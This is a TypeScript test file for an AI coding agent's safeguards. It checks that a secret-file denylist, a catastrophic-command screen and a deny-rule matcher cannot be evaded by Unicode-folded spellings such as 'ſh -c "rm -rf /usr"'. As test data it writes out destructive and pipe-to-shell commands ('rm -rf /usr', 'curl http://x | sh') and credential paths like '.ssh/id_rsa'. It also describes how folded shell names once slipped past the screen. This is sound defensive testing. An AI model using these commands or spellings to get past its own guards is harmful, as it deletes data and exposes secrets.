/**
 * F-22 - THE OS-FOLD CLASS, PINNED AT ALL THREE SITES AT ONCE.
 *
 * (`secrets.ts` - the secret denylist),  (`command-screen.ts` -
 * `matchesCatastrophic`) and  (`command-rules.ts` - the deny matcher) are
 * ONE mechanism at THREE sites: *a name compared against a denylist must be folded
 * the way the operating system folds it.* Measured over a composed population,
 * each site's fix closes only its own cells (7 / 5 / 5, summing to 17 = all
 * three), so the pairwise intersection is ZERO and no fix order is forced - but
 * all three are required, and *a class closed at one site is not a class closed*.
 *
 * ALL THREE ARE **GAPs SHARED WITH THE PUBLISHED 0.6.0**, not regressions.
 * Measured by executing the published artifact (sha1
 * `acdec23b5aa5e1ce10eb9912d061302599d83a10`): on every hostile cell here 0.6.0
 * allows and HEAD allows, and there is no cell where 0.6.0 blocks and HEAD does
 * not. They are being closed because a secret-disclosure path is not excused by
 * being old - not because this arc introduced them.
 */
import { describe, expect, test } from 'vitest';
import { matchesBuiltinDenylist } from '../src/lib/agent/secrets.js';
import { matchesCatastrophic } from '../src/lib/agent/tools.js';
import { evaluateCommandRules, validateRuleEntry } from '../src/lib/agent/command-rules.js';
import type { CommandRule, EffectiveCommandRules } from '../src/lib/agent/command-rules.js';
import {
  DOTLESS_I,
  FOLD_BENIGN_COMMANDS,
  FOLD_BENIGN_NAMES,
  FULLWIDTH_BENIGN_NAMES,
  NFKC_ONLY_SCALARS,
  OS_FOLD_MISSED,
  OS_FOLD_SCALARS,
  RULE_BASE_CELLS,
  SCREEN_BASE_COMMANDS,
  SECRET_BASE_NAMES,
  foldCells,
  foldedSpelling,
} from './fixtures/os-fold-corpus.js';

const denyRules = (entries: readonly string[]): EffectiveCommandRules => ({
  allow: [],
  deny: entries.map((entry): CommandRule => {
    const v = validateRuleEntry(entry, 'deny');
    if (!v.ok) throw new Error(`deny entry rejected: ${entry} - ${v.reason}`);
    return { entry: v.entry, tokens: v.tokens, kind: 'deny', scope: 'project' };
  }),
});

const blocked = (command: string): boolean => matchesCatastrophic(command) !== null;

// ─────────────────────────────────────────────────────────────────────────────
// THE GENERATOR IS PROVED TO GENERATE WHAT IT CLAIMS, BEFORE ANY VERDICT.
// F-21 shipped 81 inert cells from chained replaces, and a corpus whose cells all
// have the SAME SHAPE certified a false answer the batch before.
// ─────────────────────────────────────────────────────────────────────────────
describe(' the generator generates what it claims', () => {
  test('every generated cell REALLY differs from its base, and by the intended scalar', () => {
    const cells = foldCells(SECRET_BASE_NAMES, OS_FOLD_SCALARS);
    expect(cells.length).toBeGreaterThan(0);
    for (const c of cells) {
      expect(c.spelled, `cell must not be inert: ${c.base}`).not.toBe(c.base);
      const fold = OS_FOLD_SCALARS.find((f) => f.hex === c.hex);
      expect(fold, `unknown scalar ${c.hex}`).toBeDefined();
      expect(c.spelled.includes(fold!.scalar), `${c.spelled} must contain ${c.hex}`).toBe(true);
    }
  });

  test('the defect-relevant dimensions are VARIED - scalar, fold LENGTH and POSITION', () => {
    // Measured over the WHOLE corpus, not one site's bases. This assertion
    // FAILED when it was written against the secret names alone, and the cause
    // was real: no built-in denylist token contains `ffi`/`ffl`, so the two 1→3
    // folds generated ZERO cells. The corpus was EXTENDED until it could reach
    // them (see RULE_BASE_CELLS) rather than the assertion being lowered.
    const cells = [
      ...foldCells(SECRET_BASE_NAMES, OS_FOLD_SCALARS),
      ...foldCells(SCREEN_BASE_COMMANDS, OS_FOLD_SCALARS),
      ...foldCells(RULE_BASE_CELLS.map((c) => c.command), OS_FOLD_SCALARS),
    ];
    const scalars = new Set(cells.map((c) => c.hex));
    const lengths = new Set(cells.map((c) => c.foldsTo.length));
    const positions = new Set(cells.map((c) => c.occurrence));
    // every one of the eleven measured scalars produces at least one real cell
    expect(scalars.size).toBe(OS_FOLD_SCALARS.length);
    // all three fold lengths (1→1, 1→2, 1→3) are represented
    expect([...lengths].sort((a, b) => a - b)).toEqual([1, 2, 3]);
    // the substitution does not always land in the same place
    expect(positions.size).toBeGreaterThanOrEqual(2);
  });

  test('foldedSpelling returns null rather than an inert cell when the occurrence is absent', () => {
    const fold = OS_FOLD_SCALARS.find((f) => f.hex === 'U+017F')!;
    expect(foldedSpelling('README.md', fold, 0)).toBeNull(); // no 's' at all
    expect(foldedSpelling('secrets.json', fold, 99)).toBeNull();
    expect(foldedSpelling('secrets.json', fold, 0)).not.toBeNull();
  });

  test(' the corpus contains the ELEVENTH scalar as a DISCRIMINATING control', () => {
    // U+212A is folded by the OS *and* already reproduced by toLowerCase(), so it
    // must stay blocked before AND after the fix. Without it, a blanket refusal
    // would be indistinguishable from a correct fold.
    const control = OS_FOLD_SCALARS.filter((f) => f.coveredByToLowerCase);
    expect(control).toHaveLength(1);
    expect(control[0]!.hex).toBe('U+212A');
    expect(OS_FOLD_MISSED).toHaveLength(10);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SITE A -  · the secret denylist. THE DISCLOSURE PATH.
// ─────────────────────────────────────────────────────────────────────────────
describe('the secret denylist folds as the filesystem folds', () => {
  const cells = foldCells(SECRET_BASE_NAMES, OS_FOLD_SCALARS);

  test('the predicate is the predicate - positive and negative controls, same invocation', () => {
    expect(matchesBuiltinDenylist('.ssh/id_rsa')).toBe(true);
    expect(matchesBuiltinDenylist('README.md')).toBe(false);
    expect(matchesBuiltinDenylist('src/index.ts')).toBe(false);
  });

  test('EVERY OS-folded spelling of a denylisted name is refused', () => {
    const escaping = cells.filter((c) => !matchesBuiltinDenylist(c.spelled));
    expect(
      escaping.map((c) => `${c.hex} ${c.spelled}`),
      `${escaping.length} of ${cells.length} folded secret spellings escape the denylist`,
    ).toEqual([]);
  });

  test('ASCII-case respellings are refused (the arc gain over 0.6.0, held)', () => {
    for (const name of SECRET_BASE_NAMES) {
      expect(matchesBuiltinDenylist(name.toUpperCase()), name.toUpperCase()).toBe(true);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SITE B -  · matchesCatastrophic. THE UNOVERRIDABLE GUARD.
// ─────────────────────────────────────────────────────────────────────────────
describe('the catastrophic screen folds as the filesystem folds', () => {
  const cells = foldCells(SCREEN_BASE_COMMANDS, OS_FOLD_SCALARS);

  test('the predicate is the predicate - positive and negative controls', () => {
    expect(blocked('rm -rf /usr')).toBe(true);
    expect(blocked('ls -la')).toBe(false);
  });

  test('every base command is refused in its ordinary spelling (upstream proof)', () => {
    for (const c of SCREEN_BASE_COMMANDS) expect(blocked(c), c).toBe(true);
  });

  test('EVERY OS-folded spelling of a catastrophic command is refused', () => {
    const escaping = cells.filter((c) => !blocked(c.spelled));
    expect(
      escaping.map((c) => `${c.hex} ${c.spelled}`),
      `${escaping.length} of ${cells.length} folded catastrophic spellings escape the screen`,
    ).toEqual([]);
  });

  /**
   * THE VERB, NOT THE TARGET. Found by attacking this batch's OWN
   * fix after it had already passed its acceptance test 18/18.
   *
   * The first fix folded every PATH the screen compares and left the COMMAND
   * NAME on `toLowerCase()`. A folded shell name therefore never matched
   * `SHELLS`, so the `-c` payload was never screened at all and `ſh -c "rm -rf
   * /usr"` was ALLOWED while `sh -c "rm -rf /usr"` was blocked. Six of seven
   * measured cells escaped. *An acceptance test passing is not the class
   * closing, and a class closed at one site is not a class closed.*
   */
  test(' a folded SHELL NAME still screens its -c payload ', () => {
    const escaping: string[] = [];
    for (const shell of ['sh', 'bash', 'zsh', 'dash']) {
      const folded = shell.split('s').join('ſ');
      expect(blocked(`${shell} -c "rm -rf /usr"`), `control ${shell}`).toBe(true);
      if (!blocked(`${folded} -c "rm -rf /usr"`)) escaping.push(`${folded} -c`);
    }
    // a downloader or a bare pipe into a folded shell is the same evasion
    for (const upstream of ['printf "rm -rf /usr"', 'curl http://x']) {
      expect(blocked(`${upstream} | sh`), `control ${upstream} | sh`).toBe(true);
      if (!blocked(`${upstream} | ſh`)) escaping.push(`${upstream} | ſh`);
    }
    expect(escaping, `${escaping.length} folded shell-name spellings escape recursion`).toEqual([]);
  });

  test(' folding the VERB does not refuse an ordinary command (over-block arm)', () => {
    for (const c of ['sh -c "echo hi"', 'bash -c "npm run build"', 'find . -name "*.log"']) {
      expect(blocked(c), c).toBe(false);
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SITE C -  · the user/project DENY matcher.
// ─────────────────────────────────────────────────────────────────────────────
describe('the deny matcher folds, and the ALLOW direction stays exact', () => {
  test('the predicate is the predicate - deny fires, unmatched falls through to ask', () => {
    const rules = denyRules(['curl']);
    expect(evaluateCommandRules('curl http://x', rules).action).toBe('deny');
    expect(evaluateCommandRules('ls -la', rules).action).toBe('ask');
  });

  test('ASCII-case respellings cannot escape a deny rule', () => {
    for (const { entry, command } of RULE_BASE_CELLS) {
      const rules = denyRules([entry]);
      expect(evaluateCommandRules(command, rules).action, command).toBe('deny');
      const words = command.split(' ');
      words[0] = words[0]!.toUpperCase();
      expect(evaluateCommandRules(words.join(' '), rules).action, words.join(' ')).toBe('deny');
    }
  });

  test('OS-folded respellings cannot escape a deny rule', () => {
    const escaping: string[] = [];
    for (const { entry, command } of RULE_BASE_CELLS) {
      const rules = denyRules([entry]);
      for (const fold of OS_FOLD_SCALARS) {
        const spelled = foldedSpelling(command, fold, 0);
        if (spelled === null) continue;
        if (evaluateCommandRules(spelled, rules).action !== 'deny') {
          escaping.push(`${fold.hex} ${spelled}`);
        }
      }
    }
    expect(escaping, `${escaping.length} folded spellings escape their deny rule`).toEqual([]);
  });

  test(' THE ALLOW DIRECTION STAYS EXACT - a respelling must never auto-approve', () => {
    const rules: EffectiveCommandRules = {
      allow: [{ entry: 'npm run build', tokens: ['npm', 'run', 'build'], kind: 'allow', scope: 'project' }],
      deny: [],
    };
    expect(evaluateCommandRules('npm run build', rules).action).toBe('allow');
    // every respelling must fall through to ask, never to allow
    for (const variant of ['NPM run build', 'npm RUN build', 'nﬁpm run build', 'npm run buﬁld']) {
      expect(evaluateCommandRules(variant, rules).action, variant).not.toBe('allow');
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// THE BENIGN HALF - RULING 3's OVER-BLOCK SIDE. This half was GREEN BEFORE
// the fix and must stay green after it. It is not decoration: it is the only
// thing standing between "folds correctly" and "refuses anything unfamiliar".
// ─────────────────────────────────────────────────────────────────────────────
describe(' zero over-blocks - legitimate non-ASCII names stay readable', () => {
  test('every legitimate name is allowed by the secret denylist', () => {
    const refused = FOLD_BENIGN_NAMES.filter((n) => matchesBuiltinDenylist(n));
    expect(refused, `${refused.length} legitimate names refused`).toEqual([]);
  });

  test('every ordinary command is allowed by the screen', () => {
    const refused = FOLD_BENIGN_COMMANDS.filter((c) => blocked(c));
    expect(refused, `${refused.length} ordinary commands refused`).toEqual([]);
  });

  test(' THE PRESCRIBED FIX’S COST - NFKC-only scalars must NOT be folded', () => {
    // Each of these folds to ASCII under NFKC while the filesystem does not
    // resolve it at all. Refusing any of them refuses a file that does not exist.
    for (const scalar of NFKC_ONLY_SCALARS) {
      const name = `${scalar}notes.md`;
      expect(matchesBuiltinDenylist(name), `${name} must stay allowed`).toBe(false);
    }
    // and the shape that would actually collide if NFKC were applied
    expect(matchesBuiltinDenylist('Ĳsselmeer.txt')).toBe(false);
  });

  /**
   * THE CELLS THAT MAKE THE PRESCRIBED FIX'S COST OBSERVABLE HERE.
   * NFKC maps these fullwidth names exactly onto `.env`, `.pgpass` and
   * `secrets.json`, while the OS serves NONE of them for the ASCII spelling -
   * each is a distinct, creatable file (proved ENOENT against a real `.env`
   * fixture). Adopting the prescribed NFKC fold would refuse all three.
   */
  test(' fullwidth names NFKC maps ONTO denylist entries stay allowed', () => {
    for (const name of FULLWIDTH_BENIGN_NAMES) {
      expect(name.normalize('NFKC').toLowerCase()).not.toBe(name); // the cell is real
      expect(matchesBuiltinDenylist(name), `${name} must stay allowed`).toBe(false);
    }
    // the ASCII spellings they NFKC-collapse to ARE refused - the discriminator
    for (const ascii of ['.env', '.pgpass', 'secrets.json']) {
      expect(matchesBuiltinDenylist(ascii), ascii).toBe(true);
    }
  });

  test(' U+0131 (dotless i) is NOT folded - the filesystem does not fold it either', () => {
    expect(DOTLESS_I).toBe('ı');
    // `ıd_rsa` must NOT be treated as `id_rsa`: the OS serves two different files.
    expect(matchesBuiltinDenylist('ıd_rsa')).toBe(false);
    expect(matchesBuiltinDenylist('ıstanbul.txt')).toBe(false);
    // the ASCII spelling of the same prefix IS refused - the discriminator
    expect(matchesBuiltinDenylist('id_rsa')).toBe(true);
  });
});
